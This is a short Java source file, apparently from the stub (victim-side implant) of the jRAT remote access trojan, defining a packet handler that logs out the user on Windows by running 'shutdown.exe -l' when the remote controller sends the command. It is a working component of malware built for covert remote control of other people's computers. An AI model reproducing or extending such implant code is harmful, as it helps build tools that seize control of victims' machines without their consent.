package pro.jrat.stub.packets.incoming;

import com.redpois0n.common.OperatingSystem;

public class Packet30LogoutComputer extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec("shutdown.exe -l");
		}
	}

}
